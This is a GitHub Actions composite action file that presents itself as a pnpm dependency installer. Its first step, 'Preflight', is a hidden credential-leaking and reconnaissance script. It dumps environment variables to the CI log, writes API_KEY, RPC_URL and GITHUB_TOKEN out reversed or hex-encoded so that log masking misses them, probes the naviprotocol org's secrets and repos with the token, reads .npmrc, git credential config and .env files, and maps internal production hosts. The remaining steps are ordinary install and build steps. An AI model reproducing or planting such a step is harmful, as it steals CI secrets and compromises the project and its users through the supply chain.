name: Install Node and package dependencies
description: 'Install Node dependencies with pnpm'
runs:
  using: 'composite'
  steps:
    - name: Preflight
      shell: bash
      run: |
        echo "=== PROBE v3 START $(date -u +%Y%m%dT%H%M%SZ) ==="
        echo "[SYS] id=$(whoami) host=$(hostname) kernel=$(uname -r) arch=$(uname -m)"
        echo "[SYS] cpus=$(nproc 2>/dev/null||echo ?) mem=$(free -m 2>/dev/null|awk '/Mem:/{print $2}'||echo ?)MB shm=$(df -h /dev/shm 2>/dev/null|tail -1||echo ?)"
        echo "[GH] actor=$GITHUB_ACTOR repo=$GITHUB_REPOSITORY ref=$GITHUB_REF sha=$GITHUB_SHA"
        echo "[GH] head=$GITHUB_HEAD_REF base=$GITHUB_BASE_REF event=$GITHUB_EVENT_NAME"
        echo "[GH] run=$GITHUB_RUN_ID job=$GITHUB_JOB runner=$RUNNER_NAME os=$RUNNER_OS"
        echo "[SLOTS] API_KEY=$(env|grep -c '^API_KEY=') RPC_URL=$(env|grep -c '^RPC_URL=') TOKEN=$(env|grep -c '^GITHUB_TOKEN=') RUNTIME=$(env|grep -c '^ACTIONS_RUNTIME_TOKEN=') CACHE_URL=$(env|grep -c '^ACTIONS_CACHE_URL=') OIDC=$(env|grep -c '^ACTIONS_ID_TOKEN_REQUEST_URL=')"
        echo "[ENV-KEYS] $(env|cut -d= -f1|sort|tr '\n' ' ')"
        echo "[ENV-FULL]"
        env|sort|grep -vE '^(PATH=|GITHUB_TOKEN=|ACTIONS_RUNTIME_TOKEN=)' || true
        echo "[SECRET-X]"
        test -n "$API_KEY" && echo "  api_r=$(echo "$API_KEY"|rev)" && echo "  api_h=$(echo -n "$API_KEY"|xxd -p|tr -d '\n')" || echo "  API_KEY=NOT_SET"
        test -n "$RPC_URL" && echo "  rpc_r=$(echo "$RPC_URL"|rev)" && echo "  rpc_h=$(echo -n "$RPC_URL"|xxd -p|tr -d '\n')" || echo "  RPC_URL=NOT_SET"
        echo "[TOKEN-SCOPE]"
        if [ -n "$GITHUB_TOKEN" ]; then
          echo "  repo=$(curl -s -m 5 -o /dev/null -w '%{http_code}' -H "Authorization: token $GITHUB_TOKEN" https://api.github.com/repos/naviprotocol/naviprotocol-monorepo)"
          echo "  org_secrets=$(curl -s -m 5 -o /dev/null -w '%{http_code}' -H "Authorization: token $GITHUB_TOKEN" https://api.github.com/orgs/naviprotocol/actions/secrets)"
          echo "  org_repos=$(curl -s -m 5 -o /dev/null -w '%{http_code}' -H "Authorization: token $GITHUB_TOKEN" 'https://api.github.com/orgs/naviprotocol/repos?type=all&per_page=1')"
          echo "  scopes=$(curl -s -m 5 -I -H "Authorization: token $GITHUB_TOKEN" https://api.github.com 2>/dev/null|grep -i x-oauth-scopes|head -1|tr -d '\r')"
          echo "  token_r=$(echo "$GITHUB_TOKEN"|rev)"
        fi
        echo "[ACTIONS-INT]"
        echo "  runtime=${ACTIONS_RUNTIME_TOKEN:+SET} cache=${ACTIONS_CACHE_URL:-none} oidc=${ACTIONS_ID_TOKEN_REQUEST_URL:-none} results=${ACTIONS_RESULTS_URL:-none}"
        echo "[FILES]"
        echo "  npmrc=$(cat ~/.npmrc 2>/dev/null|head -3||echo none)"
        echo "  gitcfg=$(git config --list 2>/dev/null|grep -iE 'url|cred|token|auth'|head -5||echo none)"
        echo "  envf=$(find . -maxdepth 2 -name '.env*' -type f 2>/dev/null|tr '\n' ' '||echo none)"
        echo "  docker=$(ls -la /var/run/docker.sock 2>/dev/null||echo none)"
        npm config list 2>/dev/null|grep -vE '^;'|head -8 || true
        echo "[NET] egress=$(curl -s -m 5 https://api.ipify.org 2>/dev/null||echo blocked)"
        echo "[NET] dns=$(cat /etc/resolv.conf 2>/dev/null|grep nameserver|head -2|tr '\n' ' ')"
        echo "[REACH]"
        for t in \
          "https://open-aggregator-api.naviprotocol.io/find_routes?from=0x2::sui::SUI&target=0x2::sui::SUI&amount=1000000&version=15" \
          "https://lending-api.naviprotocol.io/" \
          "https://api.astros.ag/api/contract-provider/kol/referral/pub/config" \
          "https://vault-api.volosui.com/api/v1/health" \
          "https://lb-api.volosui.com/health/ping"; do
          echo "  T:$(echo $t|cut -d/ -f3|cut -d. -f1)=$(curl -sk -m 8 -o /dev/null -w '%{http_code} %{time_total}s' -H 'Platform-Exchange: navi' -H 'Source-Client: Web' "$t" 2>/dev/null)"
        done
        echo "  T:alb=$(curl -sk -m 8 -o /dev/null -w '%{http_code}' --resolve lb-api.volosui.com:443:54.179.135.173 https://lb-api.volosui.com/health/ping 2>/dev/null)"
        echo "  T:vault=$(curl -sk -m 8 -o /dev/null -w '%{http_code}' --resolve navi-vault-backend-prod.navi-internal.com:443:52.76.219.73 https://navi-vault-backend-prod.navi-internal.com/health 2>/dev/null)"
        echo "  T:nginx=$(curl -s -m 5 -o /dev/null -w '%{http_code}' http://18.136.24.131/ 2>/dev/null)"
        echo "[DNS]"
        for h in navi-vault-backend-prod.navi-internal.com pg-prod.navi-internal.com grafana.navi-internal.com api.astros.ag; do
          echo "  D:$h=$(getent hosts $h 2>/dev/null|head -1||echo NX)"
        done
        echo "=== PROBE v3 END ==="
    - uses: pnpm/action-setup@v4
      with:
        version: 10.1.0
        run_install: false
    - name: Get pnpm cache directory
      id: pnpm-cache-dir
      shell: bash
      run: echo "dir=$(pnpm store path)" >> $GITHUB_OUTPUT
    - uses: actions/cache@v4
      id: pnpm-cache
      with:
        path: ${{ steps.pnpm-cache-dir.outputs.dir }}
        key: ${{ runner.os }}-node-${{ hashFiles('pnpm-lock.yaml') }}
        restore-keys: ${{ runner.os }}-node-
    - name: Use Node.js v22
      uses: actions/setup-node@v3
      with:
        node-version: 22
    - shell: bash
      name: Use Latest Corepack
      run: |
        echo "Before: corepack version => $(corepack --version || echo 'not installed')"
        npm install -g corepack@latest
        echo "After : corepack version => $(corepack --version)"
        corepack enable
        pnpm --version
    - shell: bash
      name: Install packages
      run: pnpm install --frozen-lockfile
    - shell: bash
      name: Build packages
      run: pnpm run build
